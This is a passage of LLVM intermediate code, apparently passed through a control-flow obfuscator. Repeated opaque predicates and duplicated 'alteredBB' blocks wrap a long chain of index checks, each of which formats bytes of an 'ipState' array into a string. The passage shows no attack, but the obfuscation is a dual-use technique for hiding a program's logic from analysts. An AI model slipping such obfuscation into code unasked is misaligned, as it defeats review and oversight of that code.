  %557 = call i32 (i8*, i8*, ...) @szprintf(i8* %552, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.698, i32 0, i32 0), i32 %554, i32 %556)
  br label %558

; <label>:558:                                    ; preds = %551, %548
  %559 = load i32, i32* @x.65
  %560 = load i32, i32* @y.66
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %558
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 27
  %569 = load i32, i32* @x.65
  %570 = load i32, i32* @y.66
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %568, label %577, label %600

; <label>:577:                                    ; preds = %originalBBpart268
  %578 = load i32, i32* @x.65
  %579 = load i32, i32* @y.66
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %577
  %586 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %587 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %588 = zext i8 %587 to i32
  %589 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %590 = zext i8 %589 to i32
  %591 = call i32 (i8*, i8*, ...) @szprintf(i8* %586, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.700, i32 0, i32 0), i32 %588, i32 %590)
  %592 = load i32, i32* @x.65
  %593 = load i32, i32* @y.66
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %600

; <label>:600:                                    ; preds = %originalBBpart272, %originalBBpart268
  %601 = load i32, i32* @x.65
  %602 = load i32, i32* @y.66
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %600
  %609 = load i32, i32* %1, align 4
  %610 = icmp eq i32 %609, 28
  %611 = load i32, i32* @x.65
  %612 = load i32, i32* @y.66
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %610, label %619, label %626

; <label>:619:                                    ; preds = %originalBBpart276
  %620 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %621 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %622 = zext i8 %621 to i32
  %623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %624 = zext i8 %623 to i32
  %625 = call i32 (i8*, i8*, ...) @szprintf(i8* %620, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.701, i32 0, i32 0), i32 %622, i32 %624)
  br label %626

; <label>:626:                                    ; preds = %619, %originalBBpart276
  %627 = load i32, i32* %1, align 4
  %628 = icmp eq i32 %627, 29
  br i1 %628, label %629, label %636

; <label>:629:                                    ; preds = %626
  %630 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %631 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %632 = zext i8 %631 to i32
  %633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %634 = zext i8 %633 to i32
  %635 = call i32 (i8*, i8*, ...) @szprintf(i8* %630, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.702, i32 0, i32 0), i32 %632, i32 %634)
  br label %636

; <label>:636:                                    ; preds = %629, %626
  %637 = load i32, i32* %1, align 4
  %638 = icmp eq i32 %637, 30
  br i1 %638, label %639, label %646

; <label>:639:                                    ; preds = %636
  %640 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %642 = zext i8 %641 to i32
  %643 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %644 = zext i8 %643 to i32
  %645 = call i32 (i8*, i8*, ...) @szprintf(i8* %640, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.703, i32 0, i32 0), i32 %642, i32 %644)
  br label %646

; <label>:646:                                    ; preds = %639, %636
  %647 = load i32, i32* %1, align 4
  %648 = icmp eq i32 %647, 31
  br i1 %648, label %649, label %656

; <label>:649:                                    ; preds = %646
  %650 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %652 = zext i8 %651 to i32
  %653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %654 = zext i8 %653 to i32
  %655 = call i32 (i8*, i8*, ...) @szprintf(i8* %650, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.704, i32 0, i32 0), i32 %652, i32 %654)
  br label %656

; <label>:656:                                    ; preds = %649, %646
  %657 = load i32, i32* %1, align 4
  %658 = icmp eq i32 %657, 32
  br i1 %658, label %659, label %666

; <label>:659:                                    ; preds = %656
  %660 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %662 = zext i8 %661 to i32
  %663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %664 = zext i8 %663 to i32
  %665 = call i32 (i8*, i8*, ...) @szprintf(i8* %660, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.705, i32 0, i32 0), i32 %662, i32 %664)
  br label %666

; <label>:666:                                    ; preds = %659, %656
  %667 = load i32, i32* %1, align 4
  %668 = icmp eq i32 %667, 33
  br i1 %668, label %669, label %676

; <label>:669:                                    ; preds = %666
  %670 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %671 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %672 = zext i8 %671 to i32
  %673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %674 = zext i8 %673 to i32
  %675 = call i32 (i8*, i8*, ...) @szprintf(i8* %670, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.706, i32 0, i32 0), i32 %672, i32 %674)
  br label %676

; <label>:676:                                    ; preds = %669, %666
  %677 = load i32, i32* @x.65
  %678 = load i32, i32* @y.66
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %676
  %685 = load i32, i32* %1, align 4
  %686 = icmp eq i32 %685, 34
  %687 = load i32, i32* @x.65
  %688 = load i32, i32* @y.66
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %686, label %695, label %702

; <label>:695:                                    ; preds = %originalBBpart280
  %696 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %697 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %698 = zext i8 %697 to i32
  %699 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %700 = zext i8 %699 to i32
  %701 = call i32 (i8*, i8*, ...) @szprintf(i8* %696, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.707, i32 0, i32 0), i32 %698, i32 %700)
  br label %702

; <label>:702:                                    ; preds = %695, %originalBBpart280
  %703 = load i32, i32* @x.65
  %704 = load i32, i32* @y.66
  %705 = sub i32 %703, 1
  %706 = mul i32 %703, %705
  %707 = urem i32 %706, 2
  %708 = icmp eq i32 %707, 0
  %709 = icmp slt i32 %704, 10
  %710 = or i1 %708, %709
  br i1 %710, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %702
  %711 = load i32, i32* %1, align 4
  %712 = icmp eq i32 %711, 34
  %713 = load i32, i32* @x.65
  %714 = load i32, i32* @y.66
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %712, label %721, label %728

; <label>:721:                                    ; preds = %originalBBpart284
  %722 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %723 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %724 = zext i8 %723 to i32
  %725 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %726 = zext i8 %725 to i32
  %727 = call i32 (i8*, i8*, ...) @szprintf(i8* %722, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.708, i32 0, i32 0), i32 %724, i32 %726)
  br label %728

; <label>:728:                                    ; preds = %721, %originalBBpart284
  %729 = load i32, i32* %1, align 4
  %730 = icmp eq i32 %729, 35
  br i1 %730, label %731, label %738

; <label>:731:                                    ; preds = %728
  %732 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %734 = zext i8 %733 to i32
  %735 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %736 = zext i8 %735 to i32
  %737 = call i32 (i8*, i8*, ...) @szprintf(i8* %732, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.709, i32 0, i32 0), i32 %734, i32 %736)
  br label %738

; <label>:738:                                    ; preds = %731, %728
  %739 = load i32, i32* %1, align 4
  %740 = icmp eq i32 %739, 36
  br i1 %740, label %741, label %764

; <label>:741:                                    ; preds = %738
  %742 = load i32, i32* @x.65
  %743 = load i32, i32* @y.66
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %741
  %750 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %751 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %752 = zext i8 %751 to i32
  %753 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %754 = zext i8 %753 to i32
  %755 = call i32 (i8*, i8*, ...) @szprintf(i8* %750, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.710, i32 0, i32 0), i32 %752, i32 %754)
  %756 = load i32, i32* @x.65
  %757 = load i32, i32* @y.66
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %764

; <label>:764:                                    ; preds = %originalBBpart288, %738
  %765 = load i32, i32* %1, align 4
  %766 = icmp eq i32 %765, 37
  br i1 %766, label %767, label %774

; <label>:767:                                    ; preds = %764
  %768 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %769 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %770 = zext i8 %769 to i32
  %771 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %772 = zext i8 %771 to i32
  %773 = call i32 (i8*, i8*, ...) @szprintf(i8* %768, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.711, i32 0, i32 0), i32 %770, i32 %772)
  br label %774

; <label>:774:                                    ; preds = %767, %764
  %775 = load i32, i32* %1, align 4
  %776 = icmp eq i32 %775, 38
  br i1 %776, label %777, label %784

; <label>:777:                                    ; preds = %774
  %778 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %779 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %780 = zext i8 %779 to i32
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %782 = zext i8 %781 to i32
  %783 = call i32 (i8*, i8*, ...) @szprintf(i8* %778, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.712, i32 0, i32 0), i32 %780, i32 %782)
  br label %784

; <label>:784:                                    ; preds = %777, %774
  %785 = load i32, i32* @x.65
  %786 = load i32, i32* @y.66
  %787 = sub i32 %785, 1
  %788 = mul i32 %785, %787
  %789 = urem i32 %788, 2
  %790 = icmp eq i32 %789, 0
  %791 = icmp slt i32 %786, 10
  %792 = or i1 %790, %791
  br i1 %792, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %784
  %793 = load i32, i32* %1, align 4
  %794 = icmp eq i32 %793, 39
  %795 = load i32, i32* @x.65
  %796 = load i32, i32* @y.66
  %797 = sub i32 %795, 1
  %798 = mul i32 %795, %797
  %799 = urem i32 %798, 2
  %800 = icmp eq i32 %799, 0
  %801 = icmp slt i32 %796, 10
  %802 = or i1 %800, %801
  br i1 %802, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %794, label %803, label %810

; <label>:803:                                    ; preds = %originalBBpart292
  %804 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %805 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %806 = zext i8 %805 to i32
  %807 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %808 = zext i8 %807 to i32
  %809 = call i32 (i8*, i8*, ...) @szprintf(i8* %804, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.713, i32 0, i32 0), i32 %806, i32 %808)
  br label %810

; <label>:810:                                    ; preds = %803, %originalBBpart292
  %811 = load i32, i32* %1, align 4
  %812 = icmp eq i32 %811, 40
  br i1 %812, label %813, label %820

; <label>:813:                                    ; preds = %810
  %814 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %815 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %816 = zext i8 %815 to i32
  %817 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %818 = zext i8 %817 to i32
  %819 = call i32 (i8*, i8*, ...) @szprintf(i8* %814, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.714, i32 0, i32 0), i32 %816, i32 %818)
  br label %820

; <label>:820:                                    ; preds = %813, %810
  %821 = load i32, i32* %1, align 4
  %822 = icmp eq i32 %821, 41
  br i1 %822, label %823, label %846

; <label>:823:                                    ; preds = %820
  %824 = load i32, i32* @x.65
  %825 = load i32, i32* @y.66
  %826 = sub i32 %824, 1
  %827 = mul i32 %824, %826
  %828 = urem i32 %827, 2
  %829 = icmp eq i32 %828, 0
  %830 = icmp slt i32 %825, 10
  %831 = or i1 %829, %830
  br i1 %831, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %823
  %832 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %833 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %834 = zext i8 %833 to i32
  %835 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %836 = zext i8 %835 to i32
  %837 = call i32 (i8*, i8*, ...) @szprintf(i8* %832, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.715, i32 0, i32 0), i32 %834, i32 %836)
  %838 = load i32, i32* @x.65
  %839 = load i32, i32* @y.66
  %840 = sub i32 %838, 1
  %841 = mul i32 %838, %840
  %842 = urem i32 %841, 2
  %843 = icmp eq i32 %842, 0
  %844 = icmp slt i32 %839, 10
  %845 = or i1 %843, %844
  br i1 %845, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %846

; <label>:846:                                    ; preds = %originalBBpart296, %820
  %847 = load i32, i32* %1, align 4
  %848 = icmp eq i32 %847, 42
  br i1 %848, label %849, label %856

; <label>:849:                                    ; preds = %846
  %850 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %851 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %852 = zext i8 %851 to i32
  %853 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %854 = zext i8 %853 to i32
  %855 = call i32 (i8*, i8*, ...) @szprintf(i8* %850, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.716, i32 0, i32 0), i32 %852, i32 %854)
  br label %856

; <label>:856:                                    ; preds = %849, %846
  %857 = load i32, i32* %1, align 4
  %858 = icmp eq i32 %857, 43
  br i1 %858, label %859, label %866

; <label>:859:                                    ; preds = %856
  %860 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %861 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %862 = zext i8 %861 to i32
  %863 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %864 = zext i8 %863 to i32
  %865 = call i32 (i8*, i8*, ...) @szprintf(i8* %860, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.717, i32 0, i32 0), i32 %862, i32 %864)
  br label %866

; <label>:866:                                    ; preds = %859, %856
  %867 = load i32, i32* %1, align 4
  %868 = icmp eq i32 %867, 44
  br i1 %868, label %869, label %876

; <label>:869:                                    ; preds = %866
  %870 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %871 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %872 = zext i8 %871 to i32
  %873 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %874 = zext i8 %873 to i32
  %875 = call i32 (i8*, i8*, ...) @szprintf(i8* %870, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.718, i32 0, i32 0), i32 %872, i32 %874)
  br label %876

; <label>:876:                                    ; preds = %869, %866
  %877 = load i32, i32* %1, align 4
  %878 = icmp eq i32 %877, 45
  br i1 %878, label %879, label %886

; <label>:879:                                    ; preds = %876
  %880 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %881 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %882 = zext i8 %881 to i32
  %883 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %884 = zext i8 %883 to i32
  %885 = call i32 (i8*, i8*, ...) @szprintf(i8* %880, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.719, i32 0, i32 0), i32 %882, i32 %884)
  br label %886

; <label>:886:                                    ; preds = %879, %876
  %887 = load i32, i32* %1, align 4
  %888 = icmp eq i32 %887, 46
  br i1 %888, label %889, label %912

; <label>:889:                                    ; preds = %886
  %890 = load i32, i32* @x.65
  %891 = load i32, i32* @y.66
  %892 = sub i32 %890, 1
  %893 = mul i32 %890, %892
  %894 = urem i32 %893, 2
  %895 = icmp eq i32 %894, 0
  %896 = icmp slt i32 %891, 10
  %897 = or i1 %895, %896
  br i1 %897, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %889
  %898 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %899 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %900 = zext i8 %899 to i32
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %902 = zext i8 %901 to i32
  %903 = call i32 (i8*, i8*, ...) @szprintf(i8* %898, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.720, i32 0, i32 0), i32 %900, i32 %902)
  %904 = load i32, i32* @x.65
  %905 = load i32, i32* @y.66
  %906 = sub i32 %904, 1
  %907 = mul i32 %904, %906
  %908 = urem i32 %907, 2
  %909 = icmp eq i32 %908, 0
  %910 = icmp slt i32 %905, 10
  %911 = or i1 %909, %910
  br i1 %911, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %912

; <label>:912:                                    ; preds = %originalBBpart2100, %886
  %913 = load i32, i32* %1, align 4
  %914 = icmp eq i32 %913, 47
  br i1 %914, label %915, label %922

; <label>:915:                                    ; preds = %912
  %916 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %917 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %918 = zext i8 %917 to i32
  %919 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %920 = zext i8 %919 to i32
  %921 = call i32 (i8*, i8*, ...) @szprintf(i8* %916, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.721, i32 0, i32 0), i32 %918, i32 %920)
  br label %922

; <label>:922:                                    ; preds = %915, %912
  %923 = load i32, i32* @x.65
  %924 = load i32, i32* @y.66
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %922
  %931 = load i32, i32* %1, align 4
  %932 = icmp eq i32 %931, 48
  %933 = load i32, i32* @x.65
  %934 = load i32, i32* @y.66
  %935 = sub i32 %933, 1
  %936 = mul i32 %933, %935
  %937 = urem i32 %936, 2
  %938 = icmp eq i32 %937, 0
  %939 = icmp slt i32 %934, 10
  %940 = or i1 %938, %939
  br i1 %940, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %932, label %941, label %948

; <label>:941:                                    ; preds = %originalBBpart2104
  %942 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %943 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %944 = zext i8 %943 to i32
  %945 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %946 = zext i8 %945 to i32
  %947 = call i32 (i8*, i8*, ...) @szprintf(i8* %942, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.722, i32 0, i32 0), i32 %944, i32 %946)
  br label %948

; <label>:948:                                    ; preds = %941, %originalBBpart2104
  %949 = load i32, i32* @x.65
  %950 = load i32, i32* @y.66
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %948
  %957 = load i32, i32* %1, align 4
  %958 = icmp eq i32 %957, 49
  %959 = load i32, i32* @x.65
  %960 = load i32, i32* @y.66
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %958, label %967, label %990

; <label>:967:                                    ; preds = %originalBBpart2108
  %968 = load i32, i32* @x.65
  %969 = load i32, i32* @y.66
  %970 = sub i32 %968, 1
  %971 = mul i32 %968, %970
  %972 = urem i32 %971, 2
  %973 = icmp eq i32 %972, 0
  %974 = icmp slt i32 %969, 10
  %975 = or i1 %973, %974
  br i1 %975, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %967
  %976 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %977 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %978 = zext i8 %977 to i32
  %979 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %980 = zext i8 %979 to i32
  %981 = call i32 (i8*, i8*, ...) @szprintf(i8* %976, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.723, i32 0, i32 0), i32 %978, i32 %980)
  %982 = load i32, i32* @x.65
  %983 = load i32, i32* @y.66
  %984 = sub i32 %982, 1
  %985 = mul i32 %982, %984
  %986 = urem i32 %985, 2
  %987 = icmp eq i32 %986, 0
  %988 = icmp slt i32 %983, 10
  %989 = or i1 %987, %988
  br i1 %989, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %990

; <label>:990:                                    ; preds = %originalBBpart2112, %originalBBpart2108
  %991 = load i32, i32* %1, align 4
  %992 = icmp eq i32 %991, 50
  br i1 %992, label %993, label %1000

; <label>:993:                                    ; preds = %990
  %994 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %995 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %996 = zext i8 %995 to i32
  %997 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %998 = zext i8 %997 to i32
  %999 = call i32 (i8*, i8*, ...) @szprintf(i8* %994, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.724, i32 0, i32 0), i32 %996, i32 %998)
  br label %1000

; <label>:1000:                                   ; preds = %993, %990
  %1001 = load i32, i32* %1, align 4
  %1002 = icmp eq i32 %1001, 51
  br i1 %1002, label %1003, label %1010

; <label>:1003:                                   ; preds = %1000
  %1004 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1005 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1006 = zext i8 %1005 to i32
  %1007 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1008 = zext i8 %1007 to i32
  %1009 = call i32 (i8*, i8*, ...) @szprintf(i8* %1004, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.725, i32 0, i32 0), i32 %1006, i32 %1008)
  br label %1010

; <label>:1010:                                   ; preds = %1003, %1000
  %1011 = load i32, i32* @x.65
  %1012 = load i32, i32* @y.66
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1010
  %1019 = load i32, i32* %1, align 4
  %1020 = icmp eq i32 %1019, 52
  %1021 = load i32, i32* @x.65
  %1022 = load i32, i32* @y.66
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
